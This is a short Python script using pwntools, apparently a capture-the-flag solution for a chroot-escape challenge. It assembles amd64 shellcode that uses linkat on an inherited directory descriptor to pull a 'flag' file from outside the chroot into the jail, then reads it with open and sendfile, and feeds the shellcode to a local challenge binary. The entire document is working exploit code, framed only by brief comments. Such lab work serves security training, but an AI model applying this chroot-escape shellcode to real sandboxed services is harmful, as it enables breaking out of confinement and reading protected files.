from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

assembly = str()
# link the 'flag' file relative to oldfd - which's will be the return value of
# the first open(argv[1], ...) - to the file '/newflag' inside the chrooted
# environment
assembly += shellcraft.linkat(3, "flag", "AT_FDCWD", "newflag", 0)
# open() and sendfile() to stdout
assembly += shellcraft.open("/newflag", 0)
assembly += shellcraft.sendfile(1, "rax", 0, 0x55)
# exit cleanly
assembly += shellcraft.amd64.linux.syscall("SYS_exit", 0)

# the hostname will always be the same as challenge binary

challenge_binary = os.getenv('HOSTNAME')
with process([f"/challenge/{challenge_binary}", "/"]) as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )
